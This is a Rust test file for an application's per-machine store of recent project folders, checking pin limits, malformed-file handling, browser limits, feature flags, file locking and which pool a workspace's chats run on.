    // The safe direction: the entry then spends the recents bound like any other, so a
    // malformed file cannot grow the bound on a file read at a cold launch.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(
        file(machine.path()),
        br#"{"version":1,"at":0,"recents":[{"plane":"/planes/a","opened":1,"pinned":"yes"}]}"#,
    )
    .unwrap();

    let back = read(machine.path());

    assert!(!back.store.recent(Path::new("/planes/a")).unwrap().pinned);
}

#[test]
fn a_file_claiming_more_pins_than_charter_keeps_is_cut_to_the_bound() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    let rows: Vec<String> = (0..MOST_PINNED + 5)
        .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n},"pinned":true}}"#))
        .collect();
    std::fs::write(
        file(machine.path()),
        format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
    )
    .unwrap();

    let back = read(machine.path());

    assert_eq!(back.store.recents.len(), MOST_PINNED);
    assert_eq!(back.dropped.len(), 5);
}

#[test]
fn a_pinned_plane_read_back_does_not_spend_the_recents_bound() {
    // The mirror of the write-side rule: the two bounds are counted apart in all three
    // places the file's size is decided, and a file that held both must come back whole.
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    let mut rows: Vec<String> = (0..MOST_RECENTS)
        .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n}}}"#))
        .collect();
    rows.push(r#"{"plane":"/planes/kept","opened":1,"pinned":true}"#.to_owned());
    std::fs::write(
        file(machine.path()),
        format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
    )
    .unwrap();

    let back = read(machine.path());

    assert!(back.store.recent(Path::new("/planes/kept")).is_some());
    assert_eq!(back.store.recents.len(), MOST_RECENTS + 1);
    assert!(back.dropped.is_empty());
}

#[test]
fn forgetting_a_plane_forgets_its_pins_with_it() {
    // The same rule the approval follows: one entry, so there is never a second list of
    // pins to go stale against the list of planes.
    let mut store = remembering(&["/planes/a"]);
    store.pin(Path::new("/planes/a"), true).unwrap();
    store
        .pin_workspace(Path::new("/planes/a"), "ide", true)
        .unwrap();

    store.forget(Path::new("/planes/a"));
    store.remember(Path::new("/planes/a"), 9);

    let entry = store.recent(Path::new("/planes/a")).unwrap();
    assert!(!entry.pinned);
    assert!(entry.pinned_workspaces.is_empty());
}

#[test]
fn opening_a_pinned_plane_again_keeps_its_pins() {
    // `remember` rebuilds the entry, and an open is not an unpin any more than it is an
    // approval.
    let mut store = remembering(&["/planes/a"]);
    store.pin(Path::new("/planes/a"), true).unwrap();
    store
        .pin_workspace(Path::new("/planes/a"), "ide", true)
        .unwrap();

    store.remember(Path::new("/planes/a"), 99);

    let entry = store.recent(Path::new("/planes/a")).unwrap();
    assert!(entry.pinned);
    assert_eq!(entry.pinned_workspaces, ["ide"]);
}

// ---------------------------------------------------------------- the disk question

#[test]
fn a_path_that_is_not_utf_8_is_not_remembered_as_a_lossy_one() {
    // `display()` substitutes U+FFFD for a byte that is not UTF-8, so writing that
    // rendering would remember a path that is not the one the operator opened — and
    // later open it. JSON holds a string; a path that is not one is simply not kept.
    use std::os::unix::ffi::OsStrExt;
    let machine = machine();
    let mut store = Store::default();
    store.remember(
        Path::new(std::ffi::OsStr::from_bytes(b"/planes/not\xffutf8")),
        1,
    );
    store.remember(Path::new("/planes/ordinary"), 2);

    write(machine.path(), &store).unwrap();
    let back = read(machine.path());

    assert_eq!(
        back.store.recents.len(),
        1,
        "{:?} — a lossy path was written",
        back.store.recents
    );
    assert_eq!(
        back.store.recents[0].plane,
        PathBuf::from("/planes/ordinary")
    );
}

#[test]
fn a_remembered_plane_that_is_still_a_plane_is_usable() {
    let held = machine();
    let plane = a_plane(&held.path().join("plane"));

    assert_eq!(still_a_plane(&plane), Ok(()));
}

#[test]
fn a_remembered_plane_that_moved_or_stopped_being_one_is_dropped_with_a_reason() {
    let held = machine();
    let gone = held.path().join("gone");
    let not_a_plane = held.path().join("ordinary");
    std::fs::create_dir_all(&not_a_plane).unwrap();
    let a_file = held.path().join("file");
    std::fs::write(&a_file, b"x").unwrap();
    let linked = held.path().join("linked");
    std::os::unix::fs::symlink(a_plane(&held.path().join("real")), &linked).unwrap();

    assert!(still_a_plane(&gone).is_err_and(|why| why.contains("no longer there")));
    assert!(still_a_plane(&not_a_plane).is_err_and(|why| why.contains("not a plane")));
    assert!(still_a_plane(&a_file).is_err_and(|why| why.contains("not a directory")));
    assert!(still_a_plane(&linked).is_err_and(|why| why.contains("symlink")));
}

#[test]
fn reading_the_store_never_touches_the_planes_it_names() {
    // The reason `still_a_plane` is a separate question: a cold launch that stats sixty
    // paths hangs on the first dead network mount, with nothing drawn to say so.
    let machine = machine();
    let mut store = Store::default();
    store.remember(Path::new("/planes/nothing-is-here"), 1);
    write(machine.path(), &store).unwrap();

    let back = read(machine.path());

    assert_eq!(
        back.store.recents.len(),
        1,
        "a path that does not exist is still remembered; whether to show it is a \
         separate question asked per row"
    );
}

#[test]
fn unix_has_an_expression_for_the_mode_so_nothing_here_refuses() {
    // The other side of it is not testable from here: off unix the whole store refuses
    // (ADR 0031, charter-app#98) and this module's tests do not compile at all.
    // What that platform does is one sentence, and `supported` is where it is said.
    assert!(supported().is_ok());
}

#[test]
fn a_dropped_entry_says_which_bound_it_is_past() {
    assert_eq!(
        Room::why(true),
        format!("is past the {MOST_PINNED} projects purlis pins")
    );
    assert_eq!(
        Room::why(false),
        format!("is past the {MOST_RECENTS} planes purlis remembers")
    );
}

/// Set in a child this test binary starts, which answers from its own environment.
const ROOT_CHILD: &str = "CHARTER_TEST_MACHINE_ROOT_CHILD";

#[test]
fn the_config_home_is_read_from_this_processs_own_environment() {
    if let Some(want) = std::env::var_os(ROOT_CHILD) {
        assert_eq!(config_root(), Some(PathBuf::from(want)));
        return;
    }
    // `config_root` reads the real variables, which a test can only set by starting a
    // process with them; `rooted` above is the ladder, and this is the reading of it.
    let home = machine();
    let out = crate::forklock::output(
        std::process::Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "machine::tests::the_config_home_is_read_from_this_processs_own_environment",
                "--test-threads=1",
            ])
            .env(ROOT_CHILD, home.path())
            .env(HOME_VAR, home.path()),
    )
    .unwrap();
    assert!(
        out.status.success(),
        "{}\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("1 passed"),
        "{}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn a_change_is_said_as_what_it_is_about_and_what_happened_to_it() {
    assert_eq!(
        Change::PluginAdded("market@repo".into()).to_string(),
        "the plugin market@repo is new"
    );
    assert_eq!(
        Change::EnvChanged("PATH".into()).to_string(),
        "the environment variable PATH has a different value"
    );
    assert_eq!(Change::ProfileRemoved("work".into()).name(), "work");
}

#[test]
fn unpinning_is_never_refused_for_want_of_room_to_pin() {
    let mut store = Store::default();
    let planes: Vec<PathBuf> = (0..=MOST_PINNED)
        .map(|i| PathBuf::from(format!("/planes/p{i}")))
        .collect();
    for (i, plane) in planes.iter().enumerate() {
        store.remember(plane, 1_758_000_000 + i as u64);
    }
    for plane in &planes[..MOST_PINNED] {
        assert_eq!(store.pin(plane, true), Ok(true));
    }
    let last = &planes[MOST_PINNED];
    assert!(store.pin(last, true).is_err(), "no room to pin one more");
    assert_eq!(
        store.pin(last, false),
        Ok(false),
        "and asking to unpin what is not pinned is no change, not a refusal"
    );
}

#[test]
fn a_file_beside_the_store_is_read_up_to_its_bound_and_not_one_byte_past() {
    let machine = machine();
    std::fs::create_dir_all(dir(machine.path())).unwrap();
    std::fs::write(dir(machine.path()).join("five"), "12345").unwrap();
    std::fs::write(dir(machine.path()).join("six"), "123456").unwrap();

    assert_eq!(
        read_beside(machine.path(), "five", 5, "a test file").unwrap(),
        Some("12345".to_owned())
    );
    assert!(read_beside(machine.path(), "six", 5, "a test file").is_err());
}

#[test]
fn a_pinned_workspace_name_may_be_as_long_as_a_file_name_and_no_longer() {
    assert!(usable_workspace(&"a".repeat(LONGEST_WORKSPACE_NAME)).is_ok());
    assert!(usable_workspace(&"a".repeat(LONGEST_WORKSPACE_NAME + 1)).is_err());
}

#[test]
fn a_recent_that_is_not_an_object_is_not_an_entry_and_an_empty_one_is_an_empty_path() {
    let mut dropped = Vec::new();
    load(&serde_json::json!({"recents": [5, {}]}), &mut dropped);
    assert_eq!(
        dropped,
        vec![
            Dropped::Recent {
                plane: String::new(),
                why: "is not an entry purlis wrote".into(),
            },
            Dropped::Recent {
                plane: String::new(),
                why: "is empty".into(),
            },
        ]
    );
}

#[test]
fn the_lock_is_let_go_even_where_a_copy_of_its_descriptor_lives_on() {
    // `flock` belongs to the open file description, so a descriptor a forked child
    // inherited would hold it past the close. The unlock is what lets it go regardless.
    let machine = machine();
    let lock = Lock::on(machine.path());
    let copy = lock
        .0
        .as_ref()
        .expect("the lock was taken")
        .try_clone()
        .unwrap();

    drop(lock);

    let again = std::fs::File::open(charterd(machine.path()).join(LOCK)).unwrap();
    assert!(
        rustix::fs::flock(&again, rustix::fs::FlockOperation::NonBlockingLockExclusive).is_ok(),
        "the lock is free once its holder is dropped"
    );
    drop(copy);
}

// The eighth (#2023, ruled 2026-10-18): the browser limits set on this machine.

#[test]
fn the_browser_limits_survive_a_write_and_a_read_and_are_absent_until_one_is_set() {
    let machine = machine();
    let mut store = one_plane();
    write(machine.path(), &store).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(!text.contains("browsers"), "nothing set yet: {text}");

    store.browsers.on_this_device = Some(6);
    store.browsers.idle_minutes = Some(0);
    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(text.contains(r#""on_this_device": 6"#), "{text}");
    assert!(!text.contains("per_project"), "only what was set: {text}");
    assert_eq!(read(machine.path()).store.browsers, store.browsers);
}

/// #2835 (ruled 2026-10-20): the person's choice of this machine's own Chrome is
/// `browsers.engine = "machine"`, absent while the pinned engine is in use, and anything else
/// reads as the pinned engine.
#[test]
fn the_choice_of_this_machines_chrome_survives_a_write_and_a_read_and_anything_else_is_pinned() {
    let machine = machine();
    let store = one_plane();
    write(machine.path(), &store).unwrap();

    set_machine_chrome(machine.path(), true).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(text.contains(r#""engine": "machine""#), "{text}");
    assert!(read(machine.path()).store.browsers.machine_chrome);

    set_machine_chrome(machine.path(), false).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(
        !text.contains("browsers"),
        "the pinned engine is no setting: {text}"
    );
    for raw in [
        serde_json::json!({ "browsers": { "engine": "pinned" } }),
        serde_json::json!({ "browsers": { "engine": true } }),
    ] {
        assert!(!browsers_of(raw.get("browsers")).machine_chrome, "{raw}");
    }
}

// The ninth (#2764): the flags turned on on this machine.

#[test]
fn a_flag_survives_a_write_and_a_read_and_is_absent_until_turned_on() {
    let machine = machine();
    let mut store = one_plane();
    write(machine.path(), &store).unwrap();
    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(!text.contains("flags"), "nothing on yet: {text}");
    assert!(!read(machine.path()).store.flags.skill_studio);

    store.flags.skill_studio = true;
    write(machine.path(), &store).unwrap();

    let text = std::fs::read_to_string(file(machine.path())).unwrap();
    assert!(text.contains(r#""skill-studio": true"#), "{text}");
    assert!(read(machine.path()).store.flags.skill_studio);
}

#[test]
fn a_flag_that_is_not_true_or_not_known_reads_as_off() {
    for raw in [
        serde_json::json!({ "flags": { "skill-studio": "yes" } }),
        serde_json::json!({ "flags": { "skill-studio": 1 } }),
        serde_json::json!({ "flags": { "skill_studio": true, "another": true } }),
        serde_json::json!({ "flags": true }),
    ] {
        assert_eq!(flags_of(raw.get("flags")), Flags::default(), "{raw}");
    }
}

#[test]
fn a_browser_limit_out_of_its_bounds_reads_as_not_set() {
    let doc = serde_json::json!({
        "browsers": { "per_project": 0, "on_this_device": 100000, "idle_minutes": "ten" }
    });

    assert_eq!(browsers_of(doc.get("browsers")), BrowserLimits::default());
}

#[test]
fn only_an_ask_about_font_files_alone_grew_in_fonts_alone() {
    // #2647: a refused theme's Notice may raise the project's trust ask only about its faces.
    let font = || Change::FontChanged("themes/a/fonts/ui.woff2".to_owned());
    assert!(Consent::Grew(vec![font()]).grew_in_fonts_alone());
    assert!(
        Consent::Grew(vec![
            font(),
            Change::FontAdded("themes/a/fonts/mono.woff2".to_owned())
        ])
        .grew_in_fonts_alone()
    );
    for more in [
        Change::PluginAdded("x@market".to_owned()),
        Change::EnvChanged("PATH".to_owned()),
        Change::StartsAdded("chat-1".to_owned()),
        Change::ProfileAdded("work".to_owned()),
        Change::GrantAdded("ops".to_owned()),
        Change::PluginRemoved("y@market".to_owned()),
    ] {
        assert!(
            !Consent::Grew(vec![font(), more.clone()]).grew_in_fonts_alone(),
            "{more:?}"
        );
    }
    assert!(!Consent::New.grew_in_fonts_alone());
    assert!(!Consent::Unchanged.grew_in_fonts_alone());
    assert!(!Consent::Noted(vec![Change::FontRemoved("f".to_owned())]).grew_in_fonts_alone());
}

// Where a workspace's chats run (#2679, ruled 2026-10-20): per machine and per workspace.

#[test]
fn where_a_workspaces_chats_run_is_kept_per_workspace_and_read_back() {
    let machine = machine();
    let mut store = remembering(&["/planes/a", "/planes/b"]);
    assert_eq!(
        store.set_chats_run_on(Path::new("/planes/a"), "ide", Some("builds")),
        Ok(true)
    );
    assert_eq!(
        store.set_chats_run_on(Path::new("/planes/a"), "ide", Some("builds")),
        Ok(false)
    );
    assert_eq!(
        store.chats_run_on(Path::new("/planes/a"), "ide"),
        Some("builds")
    );
    assert_eq!(store.chats_run_on(Path::new("/planes/a"), "fleet"), None);
    assert_eq!(store.chats_run_on(Path::new("/planes/b"), "ide"), None);

    write(machine.path(), &store).unwrap();
    let back = read(machine.path());
    assert_eq!(back.store, store);
    assert_eq!(back.dropped, Vec::new());
    let text = std::fs::read_to_string(dir(machine.path()).join(FILE)).unwrap();
    let file: serde_json::Value = serde_json::from_str(&text).unwrap();
    let a = file["recents"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["plane"] == "/planes/a")
        .unwrap();
    assert_eq!(a["chatsRunOn"], serde_json::json!({ "ide": "builds" }));

    // Back on this machine: the entry is gone, and so is the key.
    assert_eq!(
        store.set_chats_run_on(Path::new("/planes/a"), "ide", None),
        Ok(true)
    );
    write(machine.path(), &store).unwrap();
    let text = std::fs::read_to_string(dir(machine.path()).join(FILE)).unwrap();
    assert!(!text.contains("chatsRunOn"), "{text}");
}

#[test]
fn a_workspace_runs_on_a_pool_named_as_a_pool_is_and_in_a_plane_purlis_remembers() {
    let mut store = remembering(&["/planes/a"]);
    for refused in ["", "Builds", "a/b", "-x"] {
        assert!(
            store
                .set_chats_run_on(Path::new("/planes/a"), "ide", Some(refused))
                .is_err(),
            "{refused:?} was taken as a pool"
        );
    }
    assert!(
        store
            .set_chats_run_on(Path::new("/planes/a"), "a/b", Some("builds"))
            .is_err()
    );
    assert!(
        store
            .set_chats_run_on(Path::new("/planes/nowhere"), "ide", Some("builds"))
            .is_err()
    );
    assert_eq!(
        store
            .recent(Path::new("/planes/a"))
            .unwrap()
            .chats_run_on
            .len(),
        0
    );
}

#[test]
fn a_pool_name_purlis_would_not_write_runs_the_workspace_on_this_machine_and_says_so() {
    let machine = machine();
    write(machine.path(), &remembering(&["/planes/a"])).unwrap();
    let path = dir(machine.path()).join(FILE);
    let mut file: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    file["recents"][0]["chatsRunOn"] =
        serde_json::json!({ "ide": "builds", "fleet": "Not A Pool", "a/b": "builds", "docs": 3 });
    std::fs::write(&path, file.to_string()).unwrap();
    let back = read(machine.path());
    let kept = &back
        .store
        .recent(Path::new("/planes/a"))
        .unwrap()
        .chats_run_on;
    assert_eq!(kept.len(), 1);
    assert_eq!(kept["ide"], "builds");
    assert_eq!(back.dropped.len(), 3, "{:?}", back.dropped);
    assert!(
        back.dropped
            .iter()
            .all(|dropped| dropped.to_string().contains("on this machine")),
        "{:?}",
        back.dropped
    );
}

#[test]
fn a_renamed_workspace_keeps_where_its_chats_run() {
    let mut store = remembering(&["/planes/a"]);
    store
        .set_chats_run_on(Path::new("/planes/a"), "ide", Some("builds"))
        .unwrap();
    assert!(store.rename_workspace(Path::new("/planes/a"), "ide", "editor"));
    assert_eq!(store.chats_run_on(Path::new("/planes/a"), "ide"), None);
    assert_eq!(
        store.chats_run_on(Path::new("/planes/a"), "editor"),
        Some("builds")
    );
}

/// What takes a lock keeps its file where no chat's sandbox opens it.
#[cfg(unix)]
#[test]
fn a_named_lock_is_kept_in_the_session_hosts_folder() {
    let machine = machine();
    let lock = Lock::named(machine.path(), "a.lock");
    assert!(lock.held());
    assert!(charterd(machine.path()).join("a.lock").is_file());
    assert!(!dir(machine.path()).join("a.lock").exists());
}

// Where a chat runs resolves in one order (#4536, ruled 2026-11-01).

#[test]
fn a_chat_runs_where_its_start_then_workspace_then_project_says_and_else_on_this_machine() {
    use PlaceLevel::{Default as Nobody, Project, Start, Workspace};
    let plane = Path::new("/planes/a");
    let mut store = remembering(&["/planes/a"]);
    let at = |store: &Store, start: Option<StartChoice>| {
        let place = store.chat_place(plane, "ide", start.as_ref());
        (place.pool, place.level)
    };
    let pool = |name: &str| Some(name.to_owned());

    assert_eq!(at(&store, None), (None, Nobody));
    store.set_project_chats_run_on(plane, Some("team")).unwrap();
    assert_eq!(at(&store, None), (pool("team"), Project));
    store.set_chats_run_here(plane, "ide").unwrap();
    assert_eq!(at(&store, None), (None, Workspace));
    store.set_chats_run_on(plane, "ide", Some("mine")).unwrap();
    assert_eq!(at(&store, None), (pool("mine"), Workspace));
    assert_eq!(at(&store, Some(StartChoice::ThisMachine)), (None, Start));
    assert_eq!(
        at(&store, Some(StartChoice::Pool("other".to_owned()))),
        (pool("other"), Start)
    );
    // Following the project again undoes either of the workspace's own.
    store.set_chats_run_on(plane, "ide", None).unwrap();
    assert_eq!(at(&store, None), (pool("team"), Project));
    store.set_chats_run_here(plane, "ide").unwrap();
    store.set_chats_run_on(plane, "ide", None).unwrap();
    assert_eq!(at(&store, None), (pool("team"), Project));
}

#[test]
fn a_project_default_and_a_workspace_set_to_this_machine_are_kept_and_follow_a_rename() {
    let machine = machine();
    let plane = Path::new("/planes/a");
    let mut store = remembering(&["/planes/a"]);
    assert_eq!(
        store.set_project_chats_run_on(plane, Some("team")),
        Ok(true)
    );
    assert_eq!(
        store.set_project_chats_run_on(plane, Some("team")),
        Ok(false)
    );
    assert_eq!(store.set_chats_run_here(plane, "ide"), Ok(true));
    assert_eq!(store.set_chats_run_here(plane, "ide"), Ok(false));
    write(machine.path(), &store).unwrap();
    let back = read(machine.path());
    assert_eq!(back.store, store);
    assert_eq!(back.dropped, Vec::new());
    let text = std::fs::read_to_string(dir(machine.path()).join(FILE)).unwrap();
    let file: serde_json::Value = serde_json::from_str(&text).unwrap();
    assert_eq!(file["recents"][0]["projectChatsRunOn"], "team");
    assert_eq!(
        file["recents"][0]["chatsRunHere"],
        serde_json::json!(["ide"])
    );

    assert!(store.rename_workspace(plane, "ide", "editor"));
    assert_eq!(store.chat_place(plane, "editor", None).pool, None);
    assert_eq!(
        store.chat_place(plane, "ide", None).pool.as_deref(),
        Some("team")
    );
}

#[test]
fn a_project_default_purlis_would_not_write_is_dropped_with_a_reason() {
    let mut dropped = Vec::new();
    let bad = serde_json::json!("../team");
    assert_eq!(project_chats_run_on_of(Some(&bad), &mut dropped), None);
    assert_eq!(dropped.len(), 1);
    assert!(
        Store::default()
            .set_project_chats_run_on(Path::new("/planes/none"), Some("../team"))
            .is_err()
    );
}

#[test]
fn removing_a_pool_clears_it_from_the_project_and_every_workspace() {
    let plane = Path::new("/planes/a");
    let mut store = remembering(&["/planes/a"]);
    store.set_project_chats_run_on(plane, Some("team")).unwrap();
    store.set_chats_run_on(plane, "ide", Some("team")).unwrap();
    store.set_chats_run_on(plane, "web", Some("other")).unwrap();
    store.recents[0].forget_pool("team");
    assert_eq!(store.recents[0].project_chats_run_on, None);
    assert_eq!(store.chat_place(plane, "ide", None).pool, None);
    assert_eq!(
        store.chat_place(plane, "web", None).pool.as_deref(),
        Some("other")
    );
}
